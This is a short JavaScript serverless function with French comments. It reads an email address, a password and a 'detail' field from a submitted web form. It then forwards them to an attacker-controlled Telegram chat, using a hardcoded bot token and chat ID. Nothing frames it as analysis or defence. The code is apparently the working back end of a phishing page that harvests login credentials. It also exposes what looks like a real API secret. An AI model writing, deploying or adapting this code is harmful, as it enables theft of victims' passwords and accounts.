const querystring = require('querystring');

export async function handler(event, context) {
  const TELEGRAM_BOT_TOKEN = "8141255892:AAFhu2NO9bg3_zDEsblztNaT_JmudJRtUpk";  // remplace par ton vrai token
  const CHAT_ID = "7625905877"; // remplace par ton vrai chat_id

  const body = querystring.parse(event.body);
  const email = body.email || 'inconnu';
  const password = body.password || 'inconnu';
  const detail = body.detail || 'aucun';

  const message = `📥 Nouveau formulaire :\n📧 Email: ${email}\n🔑 Mot de passe: ${password}\n📝 Détail: ${detail}`;

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;

  try {
    const response = await fetch(url);
    const data = await response.json();

    return {
      statusCode: 200,
      body: JSON.stringify({ ok: true, data })
    };
  } catch (error) {
    return {
      statusCode: 500,
      body: JSON.stringify({ ok: false, error: error.message })
    };
  }
}
